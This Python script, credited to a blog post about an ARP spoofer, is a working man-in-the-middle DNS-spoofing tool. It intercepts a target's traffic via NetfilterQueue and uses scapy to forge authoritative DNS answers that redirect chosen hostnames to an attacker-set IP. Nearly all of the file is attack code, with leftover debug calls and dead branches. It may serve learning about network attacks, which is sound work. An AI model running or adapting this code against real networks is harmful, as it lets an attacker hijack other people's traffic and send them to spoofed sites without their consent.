#
#https://www.padraig.io/arp-spoofer-1
#

import time
import datetime
from scapy.all import *
from typing import List
import os
import sys
import threading
import argparse
from netfilterqueue import NetfilterQueue
import pudb
def process_packet(
    interface: str,
    hostnames: List[str],
    redirect_ip: str,
    attacker_mac: str,
    target_ip: str,
    target_mac: str,
):
    def allowed():
        rightnow = datetime.datetime.now()
        if (rightnow.minute%2) == 0:
            return True
        else:
            return False
    def process_packet(packet):
        
        
        # Convert the raw payload into a scapy packet
        data = packet.get_payload()
        scapy_packet = IP(data)
        
        #print('.')
        #sys.stdout.write(".")
	#sys.stdout.flush()
        ip_src=scapy_packet[IP].src
        ip_dst=scapy_packet[IP].dst
        if '192.168.2.184' in [ip_src, ip_dst]:
            print(ip_src + '   ' + ip_dst)
        #    #if ip_dst == '239.255.255.250':
        #    packet.drop()
        #    return
        #pudb.set_trace()
        
        # Skip the packet if it doesn't have a DNS query response
        if not scapy_packet.haslayer(DNSQR):
            packet.accept()
            return
        
        # Skip the packet if doesn't have our target hostnames
        qname = scapy_packet.qd.qname.decode()
        print(qname)
        #pudb.set_trace()
        #main_domain = qname.split('.')[-3]
        #if main_domain in hostnames: #list
        #    #if allowed():
        #    #packet.allow()
        #    #else:
        #    packet.drop()
        # Add this DNS request to our records
        #add_dns_record(qname,ip_address, ttl, source) 

        if qname not in hostnames:
            packet.accept()
            return
        print(f"Got query for {qname}")
        response_packet = (
            IP(src=scapy_packet[IP].dst, dst=scapy_packet[IP].src)
            / UDP(sport=scapy_packet[UDP].dport, dport=scapy_packet[UDP].sport)
            / DNS(
                qr=1,  # Response
                aa=1,  # Authoritative response
                id=scapy_packet[DNS].id,  # Copying the DNS id from the query
                qd=scapy_packet[DNS].qd,  # Copying the
                an=DNSRR(
                    ttl=10,  # Time To Live of the packet
                    rdata=redirect_ip,  # What IP to direct to
                    rrname=qname,  # The original hostname of the query
                ),
            )
        )
        packet.set_payload(bytes(response_packet))
        #packet.accept()
        if 1==0: #packet_should_be_dropped():
            packet.drop()
        else:
            packet.accept()

    print("Powering up NetFilterQueue.....")
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)
    try:
        nfqueue.run()
        print("nfqueue.run() ran.")
    except Exception as e:
        if hasattr(e,'message'):
            print(e.message)
        else:
            print(e)
    finally:
        print("cleaning up")
        nfqueue.unbind()


def packet_processing_setup(interface, hostnames, dns_ip, attacker_mac, target_ip, target_mac):
    print('packet_processing_thread(.,.,.,.,.) called, about to call the sewing machine.')
    #pudb.set_trace()
    process_packet_thread = threading.Thread(
        target=process_packet,
        args=(
            interface,
            ["googlevideo","padraig.io."],
            dns_ip,
            attacker_mac,
            target_ip,
            target_mac,
        ),
        daemon=True,
    )
    return process_packet_thread
    #process_packet_thread.start()
    #print("process_packet_thread.start() was spun off to it's own thread")
